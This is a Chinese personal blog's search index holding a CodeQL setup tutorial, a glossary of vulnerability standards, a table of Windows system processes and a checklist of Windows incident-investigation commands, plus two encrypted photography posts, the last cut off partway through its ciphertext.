<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CodeQL</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/CodeQL/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/CodeQL/</url>
    
    <content type="html"><![CDATA[<h1 id="在VSCode中安装CodeQL"><a href="#在VSCode中安装CodeQL" class="headerlink" title="在VSCode中安装CodeQL"></a>在VSCode中安装CodeQL</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>安装环境</strong></p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">macOS</span> Sonoma <span class="hljs-number">14</span>.<span class="hljs-number">4</span> M3芯片<span class="hljs-attribute">Visual</span> Studio Code <span class="hljs-number">1</span>.<span class="hljs-number">100</span>.<span class="hljs-number">3</span><span class="hljs-attribute">codeql</span>-cli <span class="hljs-number">2</span>.<span class="hljs-number">21</span>.<span class="hljs-number">3</span><span class="hljs-attribute">codeql</span>-lib <span class="hljs-number">2</span>.<span class="hljs-number">21</span>.<span class="hljs-number">3</span></code></pre></div><p><strong>软件地址</strong></p><p>CodeQL-Lib</p><div class="code-wrapper"><pre><code class="hljs awk">介绍：包含CodeQL的标准库和内置的query文件地址：https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/github/</span>codeql</code></pre></div><p>CodeQL-Cli</p><div class="code-wrapper"><pre><code class="hljs awk">介绍：CodeQL的二进制程序地址：https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/github/</span>codeql-cli-binaries/</code></pre></div><p><strong>学习教程</strong></p><p>codeql-cli</p><div class="code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">https:</span>//docs.github.com/<span class="hljs-built_in">zh</span>/code-security/codeql-<span class="hljs-keyword">cli</span></code></pre></div><p>CodeQL教程</p><div class="code-wrapper"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>codeql.github.com<span class="hljs-regexp">/docs/</span></code></pre></div><p>query教程</p><div class="code-wrapper"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>docs.github.com<span class="hljs-regexp">/zh/</span>code-security/codeql-<span class="hljs-keyword">for</span>-vs-codehttps:<span class="hljs-regexp">//</span>codeql.github.com<span class="hljs-regexp">/docs/</span>writing-codeql-queries/ql-tutorials</code></pre></div><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><blockquote><p> 对于M芯片的MacOS系统，需要安装Xcode和Rosetta 2以兼容CodeQL</p></blockquote><h3 id="安装Xcode"><a href="#安装Xcode" class="headerlink" title="安装Xcode"></a>安装Xcode</h3><div class="code-wrapper"><pre><code class="hljs awk">方式一：在App Store搜索Xcode进行安装，安装的Xcode一般为最新版本。Xcode软件对MacOS的系统版本有要求，若macos版本为较低版本提示无法安装，可使用方式二安装。方式二：根据MacOS的系统版本选择兼容的Xcode版本，访问https:<span class="hljs-regexp">//</span>developer.apple.com<span class="hljs-regexp">/cn/</span>support<span class="hljs-regexp">/xcode/</span>查看对应的版本如MacOS <span class="hljs-number">14.5</span>可选择Xcode <span class="hljs-number">15.4</span>版本下载，访问该链接进入软件包的下载：https:<span class="hljs-regexp">//</span>developer.apple.com<span class="hljs-regexp">/download/</span>all/?q=xcode或者修改下方URI的版本号直接下载安装包https:<span class="hljs-regexp">//</span>download.developer.apple.com<span class="hljs-regexp">/Developer_Tools/</span>Xcode_15.<span class="hljs-number">4</span>/Xcode_15.<span class="hljs-number">4</span>.xip</code></pre></div><h3 id="安装Rosetta-2"><a href="#安装Rosetta-2" class="headerlink" title="安装Rosetta 2"></a>安装Rosetta 2</h3><div class="code-wrapper"><pre><code class="hljs ada">softwareupdate <span class="hljs-comment">--install-rosetta</span></code></pre></div><h3 id="安装codeql-cli"><a href="#安装codeql-cli" class="headerlink" title="安装codeql-cli"></a>安装codeql-cli</h3><p><strong>下载安装</strong></p><blockquote><p>MacOS系统选择codeql-osx64.zip文件下载</p></blockquote><div class="code-wrapper"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/github/</span>codeql-cli-binaries<span class="hljs-regexp">/releases/</span>download<span class="hljs-regexp">/v2.21.3/</span>codeql-osx64.zip将下载的codeql-osx64.zip文件解压并重命名为codel-cli</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20250605175421512.png"> </p><p><strong>配置环境变量</strong></p><blockquote><p> macOS默认使用的shell是zsh，修改全局配置文件默认为~&#x2F;.zprofile</p></blockquote><p>vim ~&#x2F;.zprofile</p><div class="code-wrapper"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">CODEQL_HOME</span>=/Users/pacemrc/software/CodeQL/codeql-cli<span class="hljs-built_in">export</span> <span class="hljs-attribute">PATH</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;CODEQL_HOME&#125;</span>:<span class="hljs-variable">$&#123;PATH&#125;</span>&quot;</span></code></pre></div><p>source ~&#x2F;.zprofile</p><p><strong>验证安装</strong></p><div class="code-wrapper"><pre><code class="hljs applescript">codeql <span class="hljs-built_in">version</span></code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20250605175143106.png"> </p><h3 id="安装codeql-lib"><a href="#安装codeql-lib" class="headerlink" title="安装codeql-lib"></a><strong>安装codeql-lib</strong></h3><p><strong>下载压缩包</strong></p><blockquote><p>下载的clodeql-lib需要和codeql-cli版本保持一致，此处为2.21.3版本</p></blockquote><div class="code-wrapper"><pre><code class="hljs crystal">访问<span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/github.com/github</span><span class="hljs-regexp">/codeql进行下载</span><span class="hljs-regexp">https:/</span><span class="hljs-regexp">/github.com/github</span><span class="hljs-regexp">/codeql/archive</span><span class="hljs-regexp">/refs/tags</span><span class="hljs-regexp">/codeql-cli/v</span>2.<span class="hljs-number">21.3</span>.zip下载完成后将codeql-codeql-cli-v2.<span class="hljs-number">21.3</span>.zip文件解压缩并重命名为codeql-<span class="hljs-class"><span class="hljs-keyword">lib</span></span></code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20250605175350216.png"> </p><h3 id="安装VSCode"><a href="#安装VSCode" class="headerlink" title="安装VSCode"></a>安装VSCode</h3><p>安装步骤略</p><h3 id="安装CodeQL插件"><a href="#安装CodeQL插件" class="headerlink" title="安装CodeQL插件"></a>安装CodeQL插件</h3><p>在VSCode的插件商店中搜索<code>CodeQL</code>，安装插件</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20250605175638327.png"> </p><p>安装CodeQL插件后，需要在该插件中配置codeql-cli的可执行文件地址</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20250605175853413.png"> </p><p>在CLI扩展路径中填写codeql-cli目录中<code>codeql可执行文件的绝对路径</code></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20250605175938572.png"> </p><p>至此，安装结束</p><h2 id="快速使用"><a href="#快速使用" class="headerlink" title="快速使用"></a>快速使用</h2><h3 id="创建CodeQL数据库"><a href="#创建CodeQL数据库" class="headerlink" title="创建CodeQL数据库"></a>创建CodeQL数据库</h3><p>将源码项目编译为CodeQL数据库，需要根据源代码项目安装对应的编程语言环境以及相关依赖包管理工具。如<code>java-sec-code</code>项目由<code>java</code>开发，使用的包管理工具为<code>maven</code>，那么需要提前安装java和maven软件并配置好环境变量</p><div class="code-wrapper"><pre><code class="hljs excel">codeql database create /Users/pacemrc/software/CodeQL/codeql-<span class="hljs-built_in">db</span>/java-<span class="hljs-built_in">sec</span>-<span class="hljs-built_in">code</span>-<span class="hljs-built_in">db</span> --language=java --command=<span class="hljs-string">&quot;mvn clean package -DskipTests&quot;</span> --source-root=/Users/pacemrc/IdeaProjects/java-<span class="hljs-built_in">sec</span>-<span class="hljs-built_in">code</span>-master</code></pre></div><p>编译后的数据库如下，其中src.zip文件为编译前的源代码项目</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20250605181330086.png"> </p><h3 id="打开CodeQL库工作区"><a href="#打开CodeQL库工作区" class="headerlink" title="打开CodeQL库工作区"></a>打开CodeQL库工作区</h3><p>在VSCode中将codeql-lib目录作为工作空间打开</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20250605182113036.png"> </p><p>选择codeql-lib文件夹</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20250605182150645.png"> </p><p>进入CodeQL插件面板</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20250605182326918.png"> </p><p>CODEQL面板中有<code>LANGUAGE</code>、和<code>QUERIES</code>三个选项卡。</p><p>在<code>LANGUAGE</code>选项卡中选择需要扫描项目的开发语言，如Java</p><p>在<code>DATABASES</code>选项卡中添加创建的CodeQL数据库</p><p>在<code>QUERIES</code>选项卡中运行ql规则文件扫描</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20250605182419092.png"> </p><h3 id="运行CodeQL查询"><a href="#运行CodeQL查询" class="headerlink" title="运行CodeQL查询"></a>运行CodeQL查询</h3><p>如Java-sec-code项目，语言选择Java，在数据库中选择编译后的数据库文件夹，选择完该两项后，在<code>QUERIES</code>中会自动显示可以执行的QL</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20250605182930507.png"> </p><p>以内置的<code>java-&gt;ql-&gt;src-&gt;Security-&gt;CWE-&gt;CWE-089-&gt;SqlTained.ql</code>规则文件为例，在左侧点击规则文件右侧的三角形箭头即可运行该条ql规则</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20250605183130458.png"> </p><p>点击运行后，右下角出现扫描进度条</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20250605183358170.png"> </p><p>扫描完成后，在右侧自动弹出扫描结果面板</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20250605183437077.png"> </p><p>点击蓝色超链接字体可查看源代码文件的详细内容</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20250605183526723.png"> </p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><div class="code-wrapper"><pre><code class="hljs awk">环境搭建：https:<span class="hljs-regexp">//m</span>p.weixin.qq.com<span class="hljs-regexp">/s/</span>Fmsh9z3hCiiA7xQPh3fY7Qhttps:<span class="hljs-regexp">//m</span>p.weixin.qq.com<span class="hljs-regexp">/s/</span>vwC7nQ_LPJhOEcuWpGrIZg</code></pre></div><p><a href="https://xz.aliyun.com/news/7574">https://xz.aliyun.com/news/7574</a></p><p><a href="https://mp.weixin.qq.com/s/VYTXD7ejEMGJJ7_4RVN7Qg">https://mp.weixin.qq.com/s/VYTXD7ejEMGJJ7_4RVN7Qg</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>代码审计</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>漏洞预警</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E9%A2%84%E8%AD%A6/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E9%A2%84%E8%AD%A6/</url>
    
    <content type="html"><![CDATA[<p>国外平台</p><p><strong>Tenable</strong></p><div class="code-wrapper"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.tenable.com<span class="hljs-regexp">/blog/</span>search?field_blog_section_tid=<span class="hljs-number">47</span>&amp;combine=</code></pre></div><h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><h1 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h1><p><strong>通用漏洞披露</strong>：为每个漏洞分配唯一的漏洞编号。</p><h1 id="CWE"><a href="#CWE" class="headerlink" title="CWE"></a>CWE</h1><p><strong>通用缺陷枚举：漏洞的</strong>类型分类**。</p><h1 id="CVSS"><a href="#CVSS" class="headerlink" title="CVSS"></a>CVSS</h1><p><strong>通用漏洞评分系统</strong>：多维度评价一个漏洞的严重性，分数在0-10之间。</p><p>CVSS v4.0</p><p>CVSS v3.1</p><p><strong>CVSS v3.0</strong>：常用</p><p>CVSS v2</p><p>KEY</p><p>SSVC</p><h1 id="ATT-CK"><a href="#ATT-CK" class="headerlink" title="ATT&amp;CK"></a>ATT&amp;CK</h1><p>由MITRE公司提出的对抗战术、技术和常识（Adversarial Tactics, Techniques, and Common Knowledge）框架，用于描述攻击者在网络入侵各阶段的技术行为</p><p><strong>核心内容</strong>：</p><ul><li><p>12项战术：如初始访问、横向移动、数据渗漏等，覆盖攻击全生命周期。</p></li><li><p>技术分类：企业版（Enterprise）、移动端（Mobile）和工业控制系统（ICS）矩阵，持续迭代更新。</p></li><li><p>应用场景：红蓝对抗、威胁情报分析、防御能力评估等</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Windows常见系统进程</title>
    <link href="/%E8%BD%AF%E4%BB%B6%E6%95%99%E7%A8%8B/Windows/%E5%B8%B8%E8%A7%81%E7%B3%BB%E7%BB%9F%E8%BF%9B%E7%A8%8B/"/>
    <url>/%E8%BD%AF%E4%BB%B6%E6%95%99%E7%A8%8B/Windows/%E5%B8%B8%E8%A7%81%E7%B3%BB%E7%BB%9F%E8%BF%9B%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="核心系统进程"><a href="#核心系统进程" class="headerlink" title="核心系统进程"></a>核心系统进程</h1><p>这些进程无法结束，是操作系统的基础。是 Windows 系统运行的根本，如果它们意外终止，会导致系统蓝屏或重启。</p><table><thead><tr><th>进程名 (Image Name)</th><th>文件名 (File Name)</th><th>功能作用描述</th></tr></thead><tbody><tr><td><strong>System</strong></td><td><code>ntoskrnl.exe</code></td><td><strong>Windows 操作系统内核</strong>。它代表操作系统本身的核心部分，运行在核心态（Kernel Mode）。它负责管理硬件抽象、内存管理、进程和线程调度、安全等最底层的任务。<strong>注意：</strong> 在“进程”选项卡中看到的“System”进程并不是一个用户态进程，而是内核本身所占用的资源（如CPU时间）的占位符。</td></tr><tr><td><strong>System Idle Process</strong></td><td>N&#x2F;A (系统虚拟进程)</td><td><strong>系统空闲进程</strong>。它不是一个真正的进程，而是用于衡量CPU空闲程度的计数器。当CPU无事可做时，就会执行“System Idle Process”，其显示的CPU占用率即为当前CPU的空闲率。该进程的PID始终为<code>0</code>。</td></tr><tr><td><strong>svchost.exe</strong></td><td><code>svchost.exe</code></td><td><strong>Service Host Process</strong>。这是<strong>最重要的进程之一</strong>。为了减少系统资源消耗，微软将多个系统服务打包，共享一个<code>svchost.exe</code>进程。因此，你会在任务管理器中看到多个<code>svchost.exe</code>实例。每个实例托管一个或多个系统服务（如Windows Update、网络相关服务、事件日志等）。</td></tr><tr><td><strong>csrss.exe</strong></td><td><code>csrss.exe</code></td><td><strong>Client&#x2F;Server Runtime Subsystem</strong>。这是一个关键的用户态子系统，负责控制台窗口、线程创建&#x2F;销毁以及部分16位虚拟MS-DOS环境。在较新版本的Windows中，其功能已被大幅削减，但它仍然是核心进程。</td></tr><tr><td><strong>wininit.exe</strong></td><td><code>wininit.exe</code></td><td><strong>Windows Initialization Process</strong>。系统启动时最早创建的进程之一，它以SYSTEM权限运行，并负责启动一些关键的系统服务，例如： • <code>services.exe</code>（服务控制管理器，SCM） • <code>lsass.exe</code>（本地安全认证子系统服务） • <code>lsm.exe</code>（本地会话管理器服务）</td></tr><tr><td><strong>services.exe</strong></td><td><code>services.exe</code></td><td>**Service Control Manager (SCM)**。这是Windows服务的总管家。它负责启动、停止系统服务，并管理服务之间的依赖关系。所有通过“服务”管理单元管理的项目都由它控制。</td></tr><tr><td><strong>lsass.exe</strong></td><td><code>lsass.exe</code></td><td><strong>Local Security Authority Subsystem Service</strong>。<strong>安全核心进程</strong>，负责系统的安全策略、用户认证（例如域登录、本地登录）、审计日志以及生成安全令牌。<strong>注意：</strong> 该进程是黑客和恶意软件（如Mimikatz）的重点攻击目标，因为它内存中可能存有密码哈希或凭证。</td></tr><tr><td><strong>winlogon.exe</strong></td><td><code>winlogon.exe</code></td><td><strong>Windows Logon Application</strong>。管理用户登录和注销。当您按下<code>Ctrl+Alt+Delete</code>时，由它负责激活安全桌面（Secure Desktop）并加载登录界面。它与<code>lsass.exe</code>紧密协作完成认证过程。</td></tr><tr><td><strong>Explorer.exe</strong></td><td><code>explorer.exe</code></td><td><strong>Windows Explorer</strong>。这提供了图形用户界面（GUI），包括任务栏、桌面、文件资源管理器等。在服务器核心版（Server Core）安装中，默认没有此进程，因为那是一个没有图形界面的命令行环境。</td></tr></tbody></table><h1 id="网络与安全相关进程"><a href="#网络与安全相关进程" class="headerlink" title="网络与安全相关进程"></a>网络与安全相关进程</h1><table><thead><tr><th>进程名 (Image Name)</th><th>文件名 (File Name)</th><th>功能作用描述</th></tr></thead><tbody><tr><td><strong>spoolsv.exe</strong></td><td><code>spoolsv.exe</code></td><td><strong>Print Spooler Service</strong>。管理所有打印作业队列和所有与打印相关的操作。如果服务器不充当打印服务器，可以考虑禁用此服务。</td></tr><tr><td><strong>svchost.exe</strong> (网络相关实例)</td><td><code>svchost.exe</code></td><td>如前所述，<code>svchost.exe</code>托管了许多服务，包括至关重要的网络服务，例如： • <strong>DHCP Client</strong> &#x2F; <strong>DNS Client</strong>  • <strong>Network Connections</strong>  • <strong>Windows Firewall</strong> (<code>mpssvc</code>)  • <strong>HTTP Service</strong> (如果安装了IIS)</td></tr><tr><td><strong>taskhost.exe</strong> &#x2F; <strong>taskhostw.exe</strong></td><td><code>taskhost*.exe</code></td><td><strong>Host Process for Windows Tasks</strong>。类似于<code>svchost.exe</code>，但它专门用于托管DLL形式的任务（如计划任务、UI相关任务），而不是服务。</td></tr></tbody></table><h1 id="管理工具与应用程序进程"><a href="#管理工具与应用程序进程" class="headerlink" title="管理工具与应用程序进程"></a>管理工具与应用程序进程</h1><p>这些进程通常在你运行特定管理工具时出现。</p><table><thead><tr><th>进程名 (Image Name)</th><th>文件名 (File Name)</th><th>功能作用描述</th></tr></thead><tbody><tr><td><strong>mmc.exe</strong></td><td><code>mmc.exe</code></td><td><strong>Microsoft Management Console</strong>。当你打开“服务器管理器”、“事件查看器”、“磁盘管理”或任何其他<code>.msc</code>后缀的管理控制台单元时，都会运行此进程。它是这些管理工具的宿主外壳。</td></tr><tr><td><strong>ServerManager.exe</strong></td><td><code>ServerManager.exe</code></td><td><strong>服务器管理器</strong>。这是Windows Server中用于添加&#x2F;删除角色和功能、管理已安装服务器角色等的图形化主界面工具。</td></tr><tr><td><strong>powershell.exe</strong> &#x2F; <strong>cmd.exe</strong></td><td><code>powershell.exe</code>&#x2F; <code>cmd.exe</code></td><td><strong>命令行界面</strong>。分别是PowerShell和命令提示符（CMD）的解释器进程。</td></tr><tr><td><strong>dllhost.exe</strong></td><td><code>dllhost.exe</code></td><td><strong>COM Surrogate</strong>。用于承载和执行COM对象（Component Object Model），这些对象本身不是可执行文件（.exe），而是动态链接库（.dll）。例如，一些 shell 扩展或后台处理任务会使用它。</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>软件教程</category>
      
      <category>Windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows常用排查操作</title>
    <link href="/%E8%BD%AF%E4%BB%B6%E6%95%99%E7%A8%8B/Windows/%E5%B8%B8%E7%94%A8%E6%8E%92%E6%9F%A5%E6%93%8D%E4%BD%9C/"/>
    <url>/%E8%BD%AF%E4%BB%B6%E6%95%99%E7%A8%8B/Windows/%E5%B8%B8%E7%94%A8%E6%8E%92%E6%9F%A5%E6%93%8D%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<h1 id="图形界面查看"><a href="#图形界面查看" class="headerlink" title="图形界面查看"></a>图形界面查看</h1><div class="code-wrapper"><pre><code class="hljs stylus">mstsc 打开远程桌面连接taskmgr 打开任务管理器ncpa<span class="hljs-selector-class">.cpl</span> 打开网络连接面板regedit 打开注册表编辑器services<span class="hljs-selector-class">.msc</span> 打开服务面板taskschd<span class="hljs-selector-class">.msc</span> 打开任务计划程序eventvwr<span class="hljs-selector-class">.msc</span> 打开时间查看器lusrmgr<span class="hljs-selector-class">.msc</span> 打开本地用户与组</code></pre></div><h1 id="命令行查看"><a href="#命令行查看" class="headerlink" title="命令行查看"></a>命令行查看</h1><p><strong>查看系统基本信息</strong></p><div class="code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">systeminfo</span></code></pre></div><p><strong>查看系统环境变量</strong></p><div class="code-wrapper"><pre><code class="hljs actionscript"><span class="hljs-keyword">set</span></code></pre></div><p><strong>查看已安装的补丁</strong></p><div class="code-wrapper"><pre><code class="hljs routeros">wmic qfe <span class="hljs-built_in">get</span> Caption, Description, HotFixID, InstalledOn</code></pre></div><p><strong>查看系统日志</strong></p><div class="code-wrapper"><pre><code class="hljs pgsql">wevtutil qe <span class="hljs-keyword">Security</span> /f:<span class="hljs-type">text</span>   查看安全日志wevtutil qe <span class="hljs-keyword">System</span> /f:<span class="hljs-type">text</span>   查看系统日志wevtutil qe Application /f:<span class="hljs-type">text</span>   查看应用日志</code></pre></div><p><strong>查看计划任务</strong></p><div class="code-wrapper"><pre><code class="hljs moonscript">schtasks /query /fo LIST /vHKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache包含几个子项：Tasks- 包含任务定义Tree- 包含任务的组织结构Plain- 包含其他任务信息Boot- 包含启动时运行的任务</code></pre></div><p><strong>查看注册表启动项</strong></p><div class="code-wrapper"><pre><code class="hljs moonscript">reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run   查看当前用户启动项reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run   查看所有用户启动项reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run   查看<span class="hljs-number">64</span>位或<span class="hljs-number">32</span>位系统启动项</code></pre></div><p>使用WMIC命令查看</p><div class="code-wrapper"><pre><code class="hljs pgsql">wmic startup <span class="hljs-keyword">get</span> caption, command, <span class="hljs-keyword">location</span>, <span class="hljs-keyword">user</span></code></pre></div><p><strong>查看系统服务</strong></p><div class="code-wrapper"><pre><code class="hljs pf">sc query //查看所有运行中的服务sc query [SEARVICE_NAME] //查看指定的服务sc query <span class="hljs-keyword">state</span>= <span class="hljs-literal">all</span> //查看所有状态的服务，包括停止的，禁用的net start //仅查看已启动的服务，仅显示服务名查看所有服务的详细列表（包括进程和命令行参数）：wmic service get name,displayname,pathname,startmode,<span class="hljs-keyword">state</span></code></pre></div><p><strong>查看用户</strong></p><div class="code-wrapper"><pre><code class="hljs crmsh">query <span class="hljs-keyword">user</span>  <span class="hljs-title">查看所有登录中的用户</span><span class="hljs-title">net</span> <span class="hljs-keyword">user</span>  <span class="hljs-title">查看所有本地可见用户</span><span class="hljs-title">net</span> <span class="hljs-keyword">user</span> <span class="hljs-title">/domain</span> 查看所有域内可见用户net localgroup administrators</code></pre></div><blockquote><p>该方法无法检查服务器上的隐藏账户。“隐藏账户”通常是通过在 Names键下的账户名前面添加一个 $符号来实现的（例如，将 admin隐藏为 $admin）</p></blockquote><p>通过注册表检查服务器的用户</p><div class="code-wrapper"><pre><code class="hljs moonscript">在注册表中导航到HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names，观察是否存在异常用户，并且对比与net user命令的返回结果是否一致。</code></pre></div><p><strong>查看进程信息</strong></p><div class="code-wrapper"><pre><code class="hljs arduino">tasklist   <span class="hljs-comment">//查看简易任务列表</span>wmic process get Name, ProcessId, ParentProcessId, CommandLine   <span class="hljs-comment">//查看详细的进程信息，包含命命令行参数</span></code></pre></div><p><strong>查看网络连接</strong></p><div class="code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">netstat -ano</span></code></pre></div>]]></content>
    
    
    <categories>
      
      <category>软件教程</category>
      
      <category>Windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>用光</title>
    <link href="/%E6%91%84%E5%BD%B1%E6%95%99%E7%A8%8B/%E7%94%A8%E5%85%89/"/>
    <url>/%E6%91%84%E5%BD%B1%E6%95%99%E7%A8%8B/%E7%94%A8%E5%85%89/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="8cb72de6b53fdb80702817b94747da08cef0972c1e2ae342080ebb9d36f603a5"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">输入密码查看</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>摄影教程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Photograph</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常用技巧</title>
    <link href="/%E6%91%84%E5%BD%B1%E6%95%99%E7%A8%8B/%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
    <url>/%E6%91%84%E5%BD%B1%E6%95%99%E7%A8%8B/%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="00b1cbd7d3311e7ac63245e356488393d624211f8da772f924c09c619c6f3bfe">33c3996212b88ecec05d553659a5cbadf166e4d24dedb06101a34b2f25fede755d0f1571c969e136ff9671a8641d3fb860ddd1b0b718d2d6cc9a61e2269bcf79facb2473772b0345b5f679d5dfdce30bf669a10a6346bc8e793bc3a40ad9590e02659adae19635668146d631ab6c0c6f6e8f98c7caecea7839addd870d8734e39413e031097acf654716132df7b2db0b17224ee77a8b104216bdb46b0812b3e459dea291dc9f2c4007bdf9ce31751b7b24c6a7623ab59187b36a3e5da2f4233d748a2185cddfb2e65080ffdc34dcd7e5609f2e46940ba035b048d2c62fc7ae60e6adfbe57714a04e9eb7b4a21e0f72529f1b270b6852c03f9f5e4e6bcf3f8358c24a88d0e9cdf50eba2444c396aa67393a52524df920af0a290c2f23509aa73f33ead820bbca4488c6d945206364d996d21b2b1f62aa49c015bcbc5b8957abe76c7d57ea759ce8ccb82d8a79e3723311cdcd7cfba77ff84adb5b8c7c3d93d5dd8f34843d4edae10658047eae13034ad2369bb020332fea4b8c9a4e6273f91758912db5d27efa0ba4162d53aa149639cac37e1999e54fd651abc5c9766dbaa842a05ad5d575a283e9df5449a78e02d60b129d9b2ab6c53863f41dd158c64aa7f2873e1ebfba51577f4533362e77f96a0915f76ecc5e62969971ed298e6a09a9bdc46dbbf4cc80d794b0c3c7537083f1479bf1d5bd56e0aa253645238b110d56ec31a22193979847c307d824e7fc09bb6e072fc79202fa42663f819d449127599e940404c07d62df47c46c05f609af9edda8e7de3f90014bfaac62e2410a3d686f971f82b33d5956ea10be08c4254833ef603fb8d5d77375bb7292af3bcf56ce537c77de901e5cec66d82e9696287b8e56c984bf3c22ba23a825fc4c2d91045e5bcc232abb2217029d82bd7caef9a7eab44fd106c5cf79bcb860f1ba5f89b574c5dc1a4a74ddec54431a20cfd9deeccd66a11dc89c2dd193667abacc9cc2ed8cfe086bc371a418a04d95be3d88365dde84f1eec2cb21ee4ad01c9ed55f9222ef2ff79aba92af77ae1f165206dbcd69430e8553a6c9595da35a06cc181b5817d9da9341fc8e9e516a6db776eb621abaacb07c7e3e6966fd1c4e098532be03d78a8f868228f48f1af9dce498b97b8b8e7dab568b94114b1e7aa8d55793b31342f1bfd2379bd5714e6224c2eb281e09fea7ee4a23a7e0d137336b1379972e9ca71705790ac31b4e55ee325f6e559d948674c65d73e6d26634d788ea9f4dc421c5b744016f37934508f435820e5384140970067336d91e484adcda6557420b367e72eebfdbcc98c3cf4d73d7981d3c39b5b64c2573bbf65ed46e41f67bc5221f77b27331430620c043f547489a101dd74ffda623a110a733b6da63e94cc826520cf5ce47f88f527265c9cb3b040ae5604d03a45ec06688c1c901b4906d7c4c1a2fd89e9cf8e62b7c4f28b64757f6edb061caf533e2e7acbfa77e1717f968cadf2a2151c02a463da364e4fc72dff0abe1c564e6a3e60d18a6ea22eb33e613d31852719f656e516c35864de9d9ecdb5ad9720feda3b97334c51072622ea48fd46a5abba45b82a3c04b8ad8ae78fe0be2cd7f8cb6edf5612fe6f1578e8ef8320e5d5c7475f8b0b79b50ff187f7c5ad0bdaa4365cd71697ca9bb8689630edbb0ffc489917c84f95d93bf88adc6ba4142a48069c6ecbff3f53c81370abb42346f16249ba14a15afde4e3540ebb46c518ba3c0ccf9cec71924fc0cab601a511cab021245471ae286e3cbf65a3bcca34ab